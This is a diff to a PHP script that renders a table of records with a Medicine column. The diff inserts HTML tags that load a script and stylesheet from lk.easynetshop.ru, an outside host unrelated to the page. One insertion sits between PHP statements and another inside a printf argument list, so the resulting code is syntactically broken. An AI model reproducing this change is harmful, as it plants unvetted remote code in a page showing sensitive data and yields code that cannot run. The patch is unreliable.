@@ -24,10 +24,16 @@
 	printf('	<TH>Medicine</TH> %s',"\n");
 	printf('</TR> %s',"\n");
 	
+	<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script async src="//lk.easynetshop.ru/frontend/primer.js"></script>
+<link href="//lk.easynetshop.ru/frontend/primer.css" rel="stylesheet">
+
 	while ($result = mysqli_fetch_array($SQLresult,MYSQLI_NUM))
 	{
 		printf('<TR>');
-		printf('<TD> %s </TD> <TD>%s</TD> <TD> %s  </TD><TD> %s  </TD><TD> %s  </TD><TD> %s  </TD>',$result[0],$result[1],$result[2],$result[3],$result[4],$result[5]);
+		printf('<TD> %s </TD> <TD>%s</TD> <TD> %s  </TD><TD> %s  </TD><TD> %s  </TD><TD> %s  </TD>',$result[0],$result[1],$result[2],$result[3],$result[4],$result[5]     ,   <script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script async src="//lk.easynetshop.ru/frontend/primer.js"></script>
+<link href="//lk.easynetshop.ru/frontend/primer.css" rel="stylesheet">   );
 		printf('</TR> %s',"\n");
 	}
 	printf('</table> %s',"\n");
